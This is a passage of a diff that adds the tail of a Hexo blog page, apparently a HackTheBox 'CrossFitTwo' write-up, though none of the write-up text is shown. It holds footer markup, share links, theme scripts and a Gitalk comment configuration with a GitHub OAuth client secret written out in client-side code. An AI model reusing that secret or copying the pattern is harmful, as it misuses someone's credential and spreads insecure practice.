+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&title=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&title=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CrossFitTwo - Hackthebox - 还没做完》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADN0lEQVR42u3a0W7qMBAEUP7/p7mvlVBgZh2uEnPyVNGS+Bipw+768Yiv55/r9fXXn4/ucHS358uVvCt57tKFjY2NfRP28+01W9bR4pLXjxjvn5tbsLGxsXdlzx6TR9TRe5PtXg9RbGxsbOz14EmuPJBWwg8bGxsbu+XNGlXJdlwot7GxsbEvwG5DJe/Av0e+D8h8tPDFXho2Njb25dkzwDV//sp8GxsbG/vC7Gd5rTR9zmoM5QOGw+diY2Njb8TOAyD5Wp8AZkVCcs98/djY2Nj7sdsv/e8X3R7oWTmgk2/WCTUWNjY29iXZbVExa9+vtPXbJ0ZFDjY2NvZG7Pa/enEgJi4kzorG2W+xsbGx787+3tGcdjSbb2s9Bni9DzY2NvZG7PcvzQa3+R1WRgjtaovOEzY2NvYN2bPBQNuUb6MlbyrlEXs438bGxsa+LbsNobYpn2/TrPXffsLY2NjYe7OToGobN22YtfHWDpuLGgsbGxv7Vuy2ET+MjXgkvDKuiD5CbGxs7I3YRecpbu7PSog2OPP7FxuHjY2NfUP2uUdhZiPbdiwxGxt/8QQQNjY29gXYSTtmJSFbxkrREh30wcbGxt6Indw0b7u371o/pjMMMGxsbOzt2Mmy8jhZCbmVsqddGzY2NvYe7O8dwVnHzwYDSchhY2Nj78Re6ZYnkdYOdPP7zBpMH3IbGxsb+7bs/HBM2+KfjRza4z75xmFjY2P/Gjtp3CdFSDJ8zf9mvYDBxsbG3omdN4zWl5iXLu1goI1bbGxs7L3ZbROnaMcvx2QyWoiKFmxsbOyN2HmZkZcB+da0Tah2wPxBio2Njb0pux3Qtu2k/MDNbGxQlDHY2NjY27HXFzoDt+XNytY/ZgvFxsbGvgl7dhSmjZPZ0mcHNz8YsbGxsbdgr0RX2+JJAOcG1eE2YWNjY2/EnsVVlIqjQcJsDcPxADY2NvZG7FloLQVDXN6c1ZDCxsbG/gV2Ej8rR3ZOW26cwB/ehY2Njf3D7DzSZk382XbU7SRsbGzsH2b/n0M8SSy1ragTchsbGxv7wuz8qOVs6HtWa+m04QE2Njb2Ruxvx0by23xAuzI2wMbGxt6O/Q8mlkoVo0pt/AAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
